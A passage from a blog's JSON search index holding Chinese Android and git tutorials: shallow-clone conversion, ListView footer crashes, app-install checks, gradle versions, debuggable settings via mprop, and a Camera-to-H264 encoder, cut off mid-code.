值得注意的是fetch指令也能使用depth参数，因此当我们直接unshallow拉取剩余历史记录依旧出现RPC-failed失败时，我们不妨逐步增大depth参数： 1git fetch --depth 50 在多次拉取部分历史记录后，再使用unshallow拉取剩余历史记录，可以使得我们的仓库完全变成正常的样子 值得注意的是，在使用了unshallow指令之后，虽然仓库变成了完整的，但是我们会发现只能拉取一个主分支相关的代码，并不能获取其他远程分支相关的代码，这个时候，我们还需要执行以下命令，把仓库的目标分支改为所有分支： 1git config remote.origin.fetch &quot;+refs/heads/*:refs/remotes/origin/*&quot; 更多关于shallow clone的讨论可以参考：https://stackoverflow.com/questions/6802145/how-to-convert-a-git-shallow-clone-to-a-full-clone/17937889#17937889https://stackoverflow.com/questions/23708231/git-shallow-clone-clone-depth-misses-remote-branches","categories":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/tags/git/"}]},{"title":"Android常见问题总结（九）","slug":"Android常见问题总结（九）","date":"2019-08-07T10:50:20.000Z","updated":"2020-05-11T07:23:44.579Z","comments":true,"path":"2019/08/07/Android常见问题总结（九）/","link":"","permalink":"https://superxlcr.github.io/2019/08/07/Android常见问题总结（九）/","excerpt":"","text":"上一篇博客传送门：Android常见问题总结（八） addFooterView与setAdapter顺序问题最近博主遇到了一个 cannot be cast to android.widget.HeaderViewListAdapter 的崩溃，在网上查阅了相关资料，发现是ListView的addFooterView与setAdapter调用顺序不当导致的（addHeaderView同理） 结论：在Android 4.4之前，如果在调用setAdapter之后调用addFooterView，则会在调用removeFooterView的时候抛出异常 原因： 先贴上Android 4.2的listView源码：http://androidxref.com/4.2_r1/xref/frameworks/base/core/java/android/widget/ListView.java再贴上Android 4.4的listView源码：http://androidxref.com/4.4.4_r1/xref/frameworks/base/core/java/android/widget/ListView.java 我们先看下抛出异常的方法removeFooterView： 123456789101112131415161718192021/*** Removes a previously-added footer view.** @param v The view to remove* @return* true if the view was removed, false if the view was not a footer view*/public boolean removeFooterView(View v) &#123; if (mFooterViewInfos.size() &gt; 0) &#123; boolean result = false; if (mAdapter != null &amp;&amp; ((HeaderViewListAdapter) mAdapter).removeFooter(v)) &#123; if (mDataSetObserver != null) &#123; mDataSetObserver.onChanged(); &#125; result = true; &#125; removeFixedViewInfo(v, mFooterViewInfos); return result; &#125; return false;&#125; 如果我们addFooterView与setAdapter调用顺序不当，当我们调用removeFooterView时，在上面的源码中的第11行，会由于mAdapter强制转换为HeaderViewListAdapter类型而抛出异常 接下来我们来看下setAdapter方法： 12345678910111213141516171819202122232425/** * Sets the data behind this ListView. * * The adapter passed to this method may be wrapped by a &#123;@link WrapperListAdapter&#125;, * depending on the ListView features currently in use. For instance, adding * headers and/or footers will cause the adapter to be wrapped. * * @param adapter The ListAdapter which is responsible for maintaining the * data backing this list and for producing a view to represent an * item in that data set. * * @see #getAdapter() */@Overridepublic void setAdapter(ListAdapter adapter) &#123; ... if (mHeaderViewInfos.size() &gt; 0|| mFooterViewInfos.size() &gt; 0) &#123; mAdapter = new HeaderViewListAdapter(mHeaderViewInfos, mFooterViewInfos, adapter); &#125; else &#123; mAdapter = adapter; &#125; ...&#125; 在setAdapter方法第19行我们可以看到，如果我们在setAdapter之前添加了headerView或者是footerView的话，则会把我们的adapter包装为HeaderViewListAdapter，因此在这种情况下当我们removeFooterView时，强制转换并不会抛出异常 接下来我们看一下4.2版本的addFooterView方法： 12345678910111213141516171819public void addFooterView(View v, Object data, boolean isSelectable) &#123; // NOTE: do not enforce the adapter being null here, since unlike in // addHeaderView, it was never enforced here, and so existing apps are // relying on being able to add a footer and then calling setAdapter to // force creation of the HeaderViewListAdapter wrapper FixedViewInfo info = new FixedViewInfo(); info.view = v; info.data = data; info.isSelectable = isSelectable; mFooterViewInfos.add(info); // in the case of re-adding a footer view, or adding one later on, // we need to notify the observer if (mAdapter != null &amp;&amp; mDataSetObserver != null) &#123; mDataSetObserver.onChanged(); &#125;&#125; 然后再对比下4.4版本的addFooterView方法： 123456789101112131415161718192021222324252627282930313233343536/** * Add a fixed view to appear at the bottom of the list. If addFooterView is * called more than once, the views will appear in the order they were * added. Views added using this call can take focus if they want. * &lt;p&gt; * Note: When first introduced, this method could only be called before * setting the adapter with &#123;@link #setAdapter(ListAdapter)&#125;. Starting with * &#123;@link android.os.Build.VERSION_CODES#KITKAT&#125;, this method may be * called at any time. If the ListView's adapter does not extend * &#123;@link HeaderViewListAdapter&#125;, it will be wrapped with a supporting * instance of &#123;@link WrapperListAdapter&#125;. * * @param v The view to add. * @param data Data to associate with this view * @param isSelectable true if the footer view can be selected */public void addFooterView(View v, Object data, boolean isSelectable) &#123; final FixedViewInfo info = new FixedViewInfo(); info.view = v; info.data = data; info.isSelectable = isSelectable; mFooterViewInfos.add(info); // Wrap the adapter if it wasn't already wrapped. if (mAdapter != null) &#123; if (!(mAdapter instanceof HeaderViewListAdapter)) &#123; mAdapter = new HeaderViewListAdapter(mHeaderViewInfos, mFooterViewInfos, mAdapter); &#125; // In the case of re-adding a footer view, or adding one later on, // we need to notify the observer. if (mDataSetObserver != null) &#123; mDataSetObserver.onChanged(); &#125; &#125;&#125; 我们可以看到，为什么4.4及其以上版本就允许addFooterView在setAdapter以后调用，关键的地方在于第27行，发现如果此时mAdapter不为HeaderViewListAdapter，则会将其包装为HeaderViewListAdapter因此，在4.4及其以上版本，我们并不需要关心setAdapter与addFooterView的调用顺序（headerView同理） 查看应用是否已安装最近博主遇到一个需求，需要查看应用是否已安装经过一番查找后，找到了如下方案： 123456789101112131415public static boolean isInstallApp(String appPackage) &#123; try &#123; PackageManager manager = KGCommonApplication.getContext().getPackageManager(); List&lt;PackageInfo&gt; pkgList = manager.getInstalledPackages(0); for (int i = 0; i &lt; pkgList.size(); i++) &#123; PackageInfo pI = pkgList.get(i); if (pI.packageName.equalsIgnoreCase(appPackage)) return true; &#125; &#125; catch (NullPointerException e) &#123; e.printStackTrace(); &#125; return false;&#125; 原理是使用 android.content.pm.PackageManager#getInstalledPackages 方法，获取所有已安装的apk，然后从返回的列表中，查找是否包含特定包名来判断特定应用是否安装然而，该方案在高版本的Android中，也许是因为系统权限的限制，我们并不能拿到所有的已安装应用在没有权限的情况下，该方法只返回了部分系统的应用 因此再通过一番查到，博主找到了一个新的方案： 12345678910public static boolean isInstallApp(String appPackage) &#123; try &#123; PackageManager manager = KGCommonApplication.getContext().getPackageManager(); PackageInfo info = manager.getPackageInfo(appPackage, PackageManager.GET_ACTIVITIES); return info != null; &#125; catch (Exception e) &#123; // ignore &#125; return false;&#125; 通过 android.content.pm.PackageManager#getPackageInfo(java.lang.String, int) 方法，我们可以获取特定的应用信息，如果用户并没有安装该应用，则会抛出 NameNotFoundException 异常由于该方法没有系统权限的限制，所以我们可以放心使用 gradle 插件版本号与gradle 版本号对应关系gradle 插件版本号：指build.gradle文件里，classpath ‘com.android.tools.build:gradle:3.1.2’，应用的插件的版本号gradle 版本号：指“gradle-wrapper.properties”中，配置的gradle 的版本号 其中，gradle 插件的版本号和 gradle 的版本号是有关联的，关系如下： 插件版本号 gradle版本号 1.0.0 - 1.1.3 2.2.1 - 2.3 1.2.0 - 1.3.1 2.2.1 - 2.9 1.5.0 2.2.1 - 2.13 2.0.0 -2.1.2 2.10 - 2.13 2.1.3 - 2.2.3 2.14.1+ 2.3.0+ 3.3+ 3.0.0+ 4.1+ 3.1.0+ 4.4+ 3.2.0 - 3.2.1 4.6+ 3.3.0 - 3.3.2 4.10.1+ 3.4.0 - 3.4.1 5.1.1+ 3.5.0+ 5.4.1 - 5.6.4 详细gradle插件版本与gradle版本更新日志如下： https://developer.android.google.cn/studio/releases/gradle-plugin#updating-plugin 处理安装出现INSTALL_FAILED_TEST_ONLY错误某次在本地debug模式编译打包apk后，通过adb install指令发现竟然无法正常安装，提示了INSTALL_FAILED_TEST_ONLY错误在网上查询资料后发现，原来是Android Studio 3.0会在debug类型apk的manifest文件application标签里自动添加 android:testOnly=”true”属性 官方文档如下：https://developer.android.google.cn/guide/topics/manifest/application-element#testOnly 解决方案有两个： 我们可以在项目中的gradle.properties全局配置中设置： 1android.injected.testOnly=false 除此以外，我们还可以安装apk时，增加上-t的参数： 1adb install -t app-debug.apk Activity启动流程图总结Activity启动流程图如下所示： 流程主要分为以下几步： 当前Activity把需要启动的目标Activity相关信息包装成Intent的形式，发送给ActivityManagerService(AMS) AMS检验信息合法后，保存信息，并通知当前Activity进入中止状态（onPaused），并通过Handler监控是否超时 当前Activity进入中止状态后，通知AMS AMS检查目标Activity在Manifest中设定启动的进程启动了没有，如果进程没有启动，则启动进程（也通过Handler计算超时），有则跳到第7步 AMS通知zygote进程fork一个子进程，以ActivityThread的main函数作为进程执行入口 新进程初始化Handler消息循环机制，初始化Application，完成启动工作后，发送ApplicationThread给AMS（以后AMS就通过ApplicationThread找到这个进程） AMS通过进程启动后传回的ApplicationThread找到进程，发送命令启动目标Activity，同时开始Handler计算超时 目标进程接到IPC指令后，通过消息循环机制，在主线程中反射实例化Activity，并执行Activity的生命周期，完成后通知AMS AMS收到Activity启动的消息后，Activity启动流程结束","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"}]},{"title":"修改debuggable调试手机应用","slug":"修改debugable调试手机应用","date":"2019-08-06T11:19:15.000Z","updated":"2020-05-11T07:23:44.814Z","comments":true,"path":"2019/08/06/修改debugable调试手机应用/","link":"","permalink":"https://superxlcr.github.io/2019/08/06/修改debugable调试手机应用/","excerpt":"","text":"最近博主在调试手机应用时遇到了一些问题，因为某些原因在一些低版本的手机上无法编译出 1android:debuggable=&quot;true&quot; 属性的安装包，导致无法调试应用 在网上经过查阅资料后，发现想要调试手机上的app只要达到以下条件之一即可： apk的AndroidManifest属性是android:debuggable=”true” 手机上的ro.debuggable属性置为1 既然我们无法编译出一个可调试的apk，那么我们只能修改手机的debuggable属性了不过由于ro.debuggable是个系统属性，因此我们使用adb setprop并不能改变它，需要重新编译rom才可以 又在网上经过查阅资料后，博主发现了一个名为mprop的工具只要操作一下几步即可处理问题： 下载mprop工具并push到手机上（博主push到了/data/local/tmp/下，不知道目录是否有影响） root手机 chmod使得mprop工具变为可执行文件 ./mprop执行 使用setprop修改想要修改的属性 ./mprop -r 使得修改生效即可 通过把手机的ro.debuggable属性设置为1之后，我们就可以愉快的调试手机上的所有应用了！ 参考自（内含mprop下载目录）：https://www.jianshu.com/p/e540f34cec07","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"}]},{"title":"git恢复某个文件到特定的版本","slug":"git恢复某个文件到特定的版本","date":"2019-07-30T11:29:09.000Z","updated":"2020-05-11T07:23:44.770Z","comments":true,"path":"2019/07/30/git恢复某个文件到特定的版本/","link":"","permalink":"https://superxlcr.github.io/2019/07/30/git恢复某个文件到特定的版本/","excerpt":"","text":"最近博主遇到一个需要git回滚代码的问题 一般而言，当我们需要把代码回滚到某次提交的情况下，我们会使用如下指令： 1234# 首先获取提交的哈希字符串git log# 然后重置回该次提交，其中**代表提交的哈希字符串git reset --hard ** 但是这样子会把所有文件都重置回该次提交的状态，如果我们只需要重置特定的文件呢？ 经过搜索，博主发现了stackoverflow上的回答：https://stackoverflow.com/questions/215718/how-can-i-reset-or-revert-a-file-to-a-specific-revision 最高票的回答告诉我们，只需要执行以下指令即可： 12# 其中**代表提交的哈希字符串git checkout ** -- file1/to/restore file2/to/restore 除此以外，我们还可以通过checkout指令把文件切换到指定分支的版本： 12# 把file1 file2切换到develop分支的版本git checkout develop -- file1/to/restore file2/to/restore","categories":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/categories/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://superxlcr.github.io/tags/git/"}]},{"title":"AndroidStudio 奇葩问题之R文件过大解析出错","slug":"AndroidStudio-奇葩问题之R文件过大解析出错","date":"2019-05-22T11:23:19.000Z","updated":"2020-05-11T07:23:44.554Z","comments":true,"path":"2019/05/22/AndroidStudio-奇葩问题之R文件过大解析出错/","link":"","permalink":"https://superxlcr.github.io/2019/05/22/AndroidStudio-奇葩问题之R文件过大解析出错/","excerpt":"","text":"最近博主在导入公司工程时，遇到了一个奇怪的问题：在AndroidStudio中，R相关的类全都变成了红色，并显示”cannot resolve symbol R” 一般而言，这种都是因为代码编译出现错误，aapt没有正确生成R文件导致的然而奇怪的是，在执行了rebuild命令后，编译却是通过的，并正确的生成了R文件，但代码中R相关的类依旧是红色 经过一番搜索，博主在stackOverflow找到了以下资料：https://stackoverflow.com/questions/17421104/android-studio-marks-r-in-red-with-error-message-cannot-resolve-symbol-r-but/50738195#50738195 根据资料的描述，这是由于我们生成的R文件太大，导致IDE解析R文件的时候出现了错误修复的方式只要把最大文件大小设置大一点即可 如上图所示，我们可以通过 help -&gt; Edit Custom Properties 打开idea.properties文件进行设置 博主的个人设置如下所示 123# custom Android Studio propertiesidea.max.intellisense.filesize=99999 设置完重启之后，即可解决问题","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"杂项","slug":"杂项","permalink":"https://superxlcr.github.io/tags/杂项/"}]},{"title":"Android音视频学习笔记（二）","slug":"Android音视频学习笔记（二）","date":"2019-05-21T11:16:37.000Z","updated":"2020-05-11T07:23:44.656Z","comments":true,"path":"2019/05/21/Android音视频学习笔记（二）/","link":"","permalink":"https://superxlcr.github.io/2019/05/21/Android音视频学习笔记（二）/","excerpt":"","text":"上篇博客传送门：Android音视频学习笔记（一） Camera视频预览Camera是官方提供的相机相关的api，官方文档如下：https://developer.android.com/reference/android/hardware/Camera如果是api 21以上的版本，可以使用Camera2，官方文档如下：https://developer.android.com/reference/android/hardware/camera2/package-summary.html xml布局文件较为简单，这里不再贴出CameraActivity相关代码如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980public class CameraActivity extends AppCompatActivity implements SurfaceHolder.Callback &#123; private static final String TAG = \"CameraActivity\"; private static final String DIR = Environment.getExternalStorageDirectory() + File.separator + \"cameraTest\" + File.separator; private static final String H264_FILE = DIR + \"camera.h264\"; private BlockingQueue&lt;byte[]&gt; queue = new LinkedBlockingQueue&lt;&gt;(); private H264Encoder h264Encoder; private boolean work = false; private Button btn; private Camera camera; @Override protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_camera); btn = (Button) findViewById(R.id.btn); btn.setOnClickListener(new View.OnClickListener() &#123; @Override public void onClick(View v) &#123; work = !work; if (work) &#123; btn.setText(\"stop\"); h264Encoder.start(); &#125; else &#123; btn.setText(\"start\"); h264Encoder.stop(); &#125; &#125; &#125;); SurfaceView surfaceView = (SurfaceView) findViewById(R.id.surface_view); surfaceView.getHolder().addCallback(this); new File(DIR).mkdirs(); camera = Camera.open(); camera.setDisplayOrientation(90); Camera.Parameters parameters = camera.getParameters(); Camera.Size size = parameters.getPreferredPreviewSizeForVideo(); Log.i(TAG, \"video preferred size width \" + size.width + \" height \" + size.height); parameters.setPreviewSize(size.width, size.height); parameters.setPreviewFormat(ImageFormat.NV21); parameters.setFocusMode(Camera.Parameters.FOCUS_MODE_CONTINUOUS_VIDEO); camera.setParameters(parameters); camera.setPreviewCallback(new Camera.PreviewCallback() &#123; @Override public void onPreviewFrame(byte[] data, Camera camera) &#123; if (data != null &amp;&amp; work) &#123; Log.i(TAG, \"data size \" + data.length); queue.add(data); &#125; &#125; &#125;); h264Encoder = new H264Encoder(queue, H264_FILE, size.width, size.height, 30, null); &#125; @Override public void surfaceCreated(SurfaceHolder holder) &#123; try &#123; camera.setPreviewDisplay(holder); camera.startPreview(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; &#125; @Override public void surfaceChanged(SurfaceHolder holder, int format, int width, int height) &#123; &#125; @Override public void surfaceDestroyed(SurfaceHolder holder) &#123; camera.release(); &#125;&#125; 在这个Activity中，我们使用了SurfaceView来显示Camera提供的预览数据有兴趣的童鞋也可以使用TextureView来代替实现相应的功能 SurfaceView官方文档如下：https://developer.android.com/reference/android/view/SurfaceViewTextureView官方文档如下：https://developer.android.com/reference/android/view/TextureView 二者的区别可以参考下面的博客：https://www.cnblogs.com/wytiger/p/5693569.htmlhttps://www.jianshu.com/p/b9a1e66e95ea 简单来说，一般而言，如果我们不需要对视频容器的View进行一些动画或者平移翻转等变化的话，可以优先考虑使用SurfaceView（消耗更低内存，减少绘制延迟） 有几个地方值得我们稍微注意一下： Camera返回的数据可能是旋转过后的，一般我们需要使用Camera#setDisplayOrientation旋转90度摆正 Camera预览时可能因为没有对焦而导致视频模糊，我们可以使用Camera#setFocusMode，并传入Camera#Parameters#FOCUS_MODE_CONTINUOUS_VIDEO获得一个自动对焦的效果 采集视频YUV数据YUV（亮度、明度、对比度）是视频最原始的数据，跟音频的PCM类似参考上面的代码，我们可以使用Camera#setPreviewCallback来设置回调，获取相机预览回调的YUV数据值得注意的是，我们需要通过Camera#setPreviewFormat，把预览回调的数据格式设置为ImageFormat#NV21 NV21是YUV420-Semeplanar格式中的一种，相关的介绍可以参考下面的文章：https://blog.csdn.net/jk198310/article/details/79084283 输出H264格式获取到以NV21格式表示的YUV数据后，我们就可以把它们编码压缩成H264格式了相关代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270/** * Created by superxlcr on 2019/4/7. */public class H264Encoder &#123; private static final String TAG = \"H264Encoder\"; private MediaCodec mediaCodec; private BlockingQueue&lt;byte[]&gt; queue; private BlockingQueue&lt;H264Frame&gt; outputQueue; private FileOutputStream fos; private int frameRate; private int width; private int height; private int inputIndexCounter; private ByteBuffer[] inputByteBuffers; private ByteBuffer[] outputByteBuffers; private byte[] configBytes; private byte[] tempBuffer; private boolean work = false; private Thread workThread; private Callback callback; /** * 根据 stackOverFlow 上老哥的回答 * https://stackoverflow.com/questions/36114808/android-setting-presentation-time-of-mediacodec * 其实 h264 只有流，并没有时间相关的信息，在某些硬件上可能播放会有问题（画面一闪而过，时间戳对不上） * 考虑封装成 mp4 处理这个问题 */ H264Encoder(BlockingQueue&lt;byte[]&gt; inputQueue, String outputFile, int width, int height, int frameRate, BlockingQueue&lt;H264Frame&gt; outputQueue) &#123; if (inputQueue == null) &#123; throw new IllegalArgumentException(\"inputQueue can not be null !\"); &#125; queue = inputQueue; this.outputQueue = outputQueue; String mime; if (Build.VERSION.SDK_INT &gt;= Build.VERSION_CODES.LOLLIPOP) &#123; mime = MediaFormat.MIMETYPE_VIDEO_AVC; &#125; else &#123; mime = \"video/avc\"; &#125; try &#123; fos = new FileOutputStream(new File(outputFile)); mediaCodec = MediaCodec.createEncoderByType(mime); &#125; catch (IOException e) &#123; throw new IllegalArgumentException(e.toString()); &#125; // 我们需要把视频内容旋转90度，长宽对调 MediaFormat mediaFormat = MediaFormat.createVideoFormat(mime, height, width); mediaFormat.setInteger(MediaFormat.KEY_COLOR_FORMAT, MediaCodecInfo.CodecCapabilities.COLOR_FormatYUV420SemiPlanar); // NV12 mediaFormat.setInteger(MediaFormat.KEY_BIT_RATE, width * height * 5); mediaFormat.setInteger(MediaFormat.KEY_FRAME_RATE, frameRate); mediaFormat.setInteger(MediaFormat.KEY_I_FRAME_INTERVAL, 1); Bundle bundle = new Bundle(); bundle.putInt(MediaFormat.KEY_I_FRAME_INTERVAL, 1); mediaCodec.setParameters(bundle); mediaCodec.configure(mediaFormat, null, null, MediaCodec.CONFIGURE_FLAG_ENCODE); this.frameRate = frameRate; this.width = width; this.height = height; tempBuffer = new byte[width * height * 3 / 2]; Log.i(TAG, String.format(\"width is %d height is %d frameRate is %d tempBuffer size is %d\", width, height, frameRate, tempBuffer.length)); &#125; public void setCallback(Callback callback) &#123; this.callback = callback; &#125; public synchronized void start() &#123; if (work) &#123; return; &#125; work = true; mediaCodec.start(); inputByteBuffers = mediaCodec.getInputBuffers(); outputByteBuffers = mediaCodec.getOutputBuffers(); workThread = new Thread(new Runnable() &#123; @Override public void run() &#123; inputIndexCounter = 0; while (work || !queue.isEmpty()) &#123; try &#123; Log.i(TAG, \"try take data, left data \" + queue.size()); byte[] data = queue.take(); NV21ToNV12(data, tempBuffer); NV12Rotate90(tempBuffer, data); Log.i(TAG, \"take data size \" + data.length); int inputIndex = mediaCodec.dequeueInputBuffer(-1); Log.i(TAG, \"get input index \" + inputIndex); if (inputIndex &gt;= 0) &#123; ByteBuffer inputBuffer = inputByteBuffers[inputIndex]; inputBuffer.clear(); inputBuffer.put(data); inputBuffer.limit(data.length); int flags = !work &amp;&amp; queue .isEmpty() ? MediaCodec.BUFFER_FLAG_END_OF_STREAM : 0; long time = getPresentationTimeUs(inputIndexCounter); Log.i(TAG, \"input indexCounter \" + inputIndexCounter + \" time \" + time); mediaCodec.queueInputBuffer(inputIndex, 0, data.length, time, flags); inputIndexCounter++; &#125; MediaCodec.BufferInfo bufferInfo = new MediaCodec.BufferInfo(); int outputIndex = mediaCodec.dequeueOutputBuffer(bufferInfo, 0); Log.i(TAG, \"get output index \" + outputIndex); while (outputIndex != MediaCodec.INFO_TRY_AGAIN_LATER) &#123; if (outputIndex == MediaCodec.INFO_OUTPUT_FORMAT_CHANGED) &#123; Log.i(TAG, \"get output format\"); if (callback != null) &#123; callback.onFormatChange(mediaCodec.getOutputFormat()); &#125; &#125; else if (outputIndex == MediaCodec.INFO_OUTPUT_BUFFERS_CHANGED) &#123; Log.i(TAG, \"output buffers change !\"); outputByteBuffers = mediaCodec.getOutputBuffers(); &#125; else &#123; ByteBuffer outputBuffer = outputByteBuffers[outputIndex]; byte[] outData = new byte[bufferInfo.size]; outputBuffer.position(bufferInfo.offset); outputBuffer.get(outData); if ((bufferInfo.flags &amp; MediaCodec.BUFFER_FLAG_CODEC_CONFIG) != 0) &#123; Log.i(TAG, \"flag codec config !\"); configBytes = outData; &#125; else if ((bufferInfo.flags &amp; MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0) &#123; Log.i(TAG, \"flag key frame\"); byte[] keyframe = new byte[bufferInfo.size + configBytes.length]; System.arraycopy(configBytes, 0, keyframe, 0, configBytes.length); System.arraycopy(outData, 0, keyframe, configBytes.length, outData.length); if (outputQueue != null) &#123; Log.i(TAG, \"output time \" + bufferInfo.presentationTimeUs); outputQueue .add(new H264Frame(keyframe, bufferInfo.flags, bufferInfo.presentationTimeUs)); &#125; try &#123; fos.write(keyframe); fos.flush(); &#125; catch (IOException e) &#123; // ignore &#125; &#125; else &#123; Log.i(TAG, \"flag nothing\"); if (outputQueue != null) &#123; Log.i(TAG, \"output time \" + bufferInfo.presentationTimeUs); outputQueue .add(new H264Frame(outData, bufferInfo.flags, bufferInfo.presentationTimeUs)); &#125; try &#123; fos.write(outData); fos.flush(); &#125; catch (IOException e) &#123; // ignore &#125; &#125; mediaCodec.releaseOutputBuffer(outputIndex, false); &#125; outputIndex = mediaCodec.dequeueOutputBuffer(bufferInfo, 0); Log.i(TAG, \"get output index \" + outputIndex); &#125; &#125; catch (InterruptedException e) &#123; // ignore &#125; &#125; try &#123; fos.close(); &#125; catch (IOException e) &#123; Log.e(TAG, Log.getStackTraceString(e)); &#125; mediaCodec.stop(); mediaCodec.release(); Log.i(TAG, \"finish h264 encode\"); if (callback != null) &#123; callback.onEncodeFinish(); &#125; &#125; &#125;); workThread.start(); &#125; public synchronized void stop() &#123; if (!work) &#123; return; &#125; work = false; if (workThread != null &amp;&amp; workThread.isAlive()) &#123; workThread.interrupt(); &#125; &#125; private void NV21ToNV12(byte[] nv21, byte[] nv12) &#123; if (nv21 == null || nv12 == null) return; int frameSize = width * height; int j; // Y System.arraycopy(nv21, 0, nv12, 0, frameSize); // U for (j = 0; j &lt; frameSize / 2; j += 2) &#123; nv12[frameSize + j] = nv21[frameSize + j + 1]; &#125; // V for (j = 0; j &lt; frameSize / 2; j += 2) &#123; nv12[frameSize + j + 1] = nv21[frameSize + j]; &#125; &#125; private void NV12Rotate90(byte[] nv12, byte[] nv12rotate90) &#123; if (nv12 == null || nv12rotate90 == null) return; int frameSize = width * height; // Y for (int i = 0; i &lt; frameSize; i++) &#123; int x = i % height; int y = i / height; int oldX = y; int oldY = height - x - 1; nv12rotate90[i] = nv12[oldX + oldY * width]; &#125; int halfHeight = height / 2; // U for (int j = 0; j &lt; frameSize / 2; j += 2) &#123; int x = j % height; int y = j / height; int oldX = y * 2; int oldY = halfHeight - 1 - x / 2; int rotateIndex = frameSize + j; int originIndex = frameSize + oldX + oldY * width; try &#123; nv12rotate90[rotateIndex] = nv12[originIndex]; &#125; catch (IndexOutOfBoundsException e) &#123; Log.e(TAG, String.format( \"error with j %d x %d y %d oldX %d oldY %d rotateIndex %d originIndex %d\", j, x, y, oldX, oldY, rotateIndex, originIndex)); throw e; &#125; &#125; // V for (int j = 1; j &lt; frameSize / 2; j += 2) &#123; int x = j % height; int y = j / height; int oldX = y * 2 + 1; int oldY = halfHeight - 1 - (x - 1) / 2; nv12rotate90[frameSize + j] = nv12[frameSize + oldX + oldY * width]; &#125; &#125; private long getPresentationTimeUs(int frameIndex) &#123; return frameIndex * 1000 * 1000 / frameRate; &#125; public interface Callback &#123; void onEncodeFinish(); void onFormatChange(MediaFormat format); &#125;&#125; 这里我们通过MediaCodec创建硬件编码器，并传入一些关键的参数来进行H264编码官方的MediaCodec文档如下：https://developer.android.com/reference/android/media/MediaCodec 传入的关键参数如下： 视频长宽：这个我们可以通过Camera#Parameters#getPreferredPreviewSizeForVideo来获取推荐的视频录制大小（长宽自己随便填可能会导致编码失败） MediaFormat#KEY_COLOR_FORMAT：YUV格式，我们使用的是NV21，但这里只支持NV12，因此我们传入MediaCodecInfo#CodecCapabilities#COLOR_FormatYUV420SemiPlanar MediaFormat#KEY_BIT_RATE：码率，一般使用的是 长 x 宽 x 一个系数（这里取的5），码率越高视频越大，也越清晰 MediaFormat#KEY_FRAME_RATE：帧率，这个我们可以通过Camera#Parameters#getSupportedPreviewFpsRange来获取，在这个例子中我们则是写死了30 MediaFormat#KEY_I_FRAME_INTERVAL：每秒关键帧数，例子填的是每秒1帧关键帧 值得注意的是，在Android 6.0中，通过MediaCodec#configure来设置关键帧在某些机型上会出现失效的情况，进而影响视频的编码这时我们可以通过MediaCodec#setParameters来设置相应的关键帧参数，具体代码如下： 123Bundle bundle = new Bundle();bundle.putInt(MediaFormat.KEY_I_FRAME_INTERVAL, 1);mediaCodec.setParameters(bundle); 另外值得注意的有以下几个点： MediaCodec硬件编码器仅支持NV12格式，因此我们需要把Camera回调的NV21格式转为NV12格式，主要是U分量与V分量的对调，相关代码可见H264Encoder#NV21ToNV12 正如上面所说Camera预览时需要旋转90度摆正，而Camera回调回来的YUV数据是没有旋转的，因此在编码前我们需要旋转YUV数据，相关代码可见H264Encoder#NV12Rotate90 不同的手机上硬件编码效率不一致，相差甚远，有的手机非常快（存放数据的阻塞队列几乎不留任何数据），而有的则会囤积200多条数据（估计这也是用FFMPEG进行软编码的原因？）","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"音视频","slug":"音视频","permalink":"https://superxlcr.github.io/tags/音视频/"}]},{"title":"Android音视频学习笔记（一）","slug":"Android音视频学习笔记（一）","date":"2019-05-18T07:20:46.000Z","updated":"2020-05-11T07:23:44.654Z","comments":true,"path":"2019/05/18/Android音视频学习笔记（一）/","link":"","permalink":"https://superxlcr.github.io/2019/05/18/Android音视频学习笔记（一）/","excerpt":"","text":"最近学习了一些关于Android音视频的知识，在此写博客记录一下 学习思路关于Android音视频的学习思路参考的是这篇博客：https://www.cnblogs.com/renhui/p/7452572.html 初步学习主要分为四项任务： AudioRecord录制PCM，输出WAV格式，AudioTrack播放PCM Camera采集视频YUV数据，输出H264格式 MediaExtractor和MediaMuxer解析和封装mp4文件 MediaCodec编译AAC与H264格式，封装mp4 AudioRecord录制PCM，输出WAV格式，AudioTrack播放PCM这个任务分为三个部分： 使用系统AudioRecord API录制PCM 通过为PCM格式文件添加文件头，封装为WAV格式 使用系统AudioTrack API播放PCM 使用系统AudioRecord API录制PCM官方API文档：https://developer.android.com/reference/android/media/AudioRecord 话不多说，封装的PcmRecorder代码如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129/** * Created by superxlcr on 2019/3/17. */public class PcmRecorder &#123; private static final String TAG = \"PcmRecorder\"; private int sampleRate; private int channel; private int bitWidth; private AudioRecord audioRecord; private int bufferSize; private byte buffer[]; private FileOutputStream fos = null; private BlockingQueue&lt;byte[]&gt; queue = null; private Handler workHandler; private boolean work; PcmRecorder(int sampleRate, int channel, int bitWidth, String fileOutputPath, BlockingQueue&lt;byte[]&gt; queue) &#123; this(sampleRate, channel, bitWidth); File outputFile = new File(fileOutputPath); try &#123; fos = new FileOutputStream(outputFile); &#125; catch 